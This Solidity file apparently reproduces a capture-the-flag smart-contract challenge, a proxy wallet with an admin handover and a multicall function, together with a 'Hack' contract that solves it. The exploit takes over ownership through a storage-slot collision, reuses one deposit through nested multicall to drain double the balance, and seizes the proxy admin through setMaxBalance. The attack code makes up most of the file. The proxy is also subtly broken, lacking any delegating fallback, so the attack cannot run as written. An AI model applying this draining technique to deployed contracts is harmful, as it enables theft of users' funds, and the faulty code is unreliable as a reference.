// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract UpgradeableProxy {
    function _upgradeTo(address newImplementation) internal virtual;

    constructor(address _implementation, bytes memory _initData) {}
}

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    function _upgradeTo(address newImplementation) internal override {
        // Implementation would set the implementation address
        // For our purposes, this is just a placeholder
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract Hack {
    PuzzleProxy public target;
    PuzzleWallet public wallet;

    constructor(address _target) {
        target = PuzzleProxy(_target);
        wallet = PuzzleWallet(_target);
    }

    function hack(address walletAddress) public payable {
        uint256 contractBalance = address(target).balance;
        require(contractBalance > 0, "Contract has no balance");

        target.proposeNewAdmin(address(this));

        (bool success1, ) = address(target).call(
            abi.encodeWithSelector(
                wallet.addToWhitelist.selector,
                address(this)
            )
        );
        require(success1, "addToWhitelist failed");

        bytes[] memory nestedDeposit = new bytes[](1);
        nestedDeposit[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory outerMulticall = new bytes[](3);
        outerMulticall[0] = abi.encodeWithSelector(
            wallet.multicall.selector,
            nestedDeposit
        );
        outerMulticall[1] = abi.encodeWithSelector(wallet.deposit.selector);
        outerMulticall[2] = abi.encodeWithSelector(
            wallet.execute.selector,
            address(this),
            contractBalance * 2,
            ""
        );

        (bool success2, ) = address(target).call{value: contractBalance}(
            abi.encodeWithSelector(wallet.multicall.selector, outerMulticall)
        );
        require(success2, "multicall drain failed");

        (bool success4, ) = address(target).call(
            abi.encodeWithSelector(
                wallet.addToWhitelist.selector,
                walletAddress
            )
        );
        require(success4, "addToWhitelist wallet failed");

        (bool success3, ) = address(target).call(
            abi.encodeWithSelector(
                wallet.setMaxBalance.selector,
                uint256(uint160(walletAddress))
            )
        );
        require(success3, "setMaxBalance failed");
    }

    receive() external payable {}
}
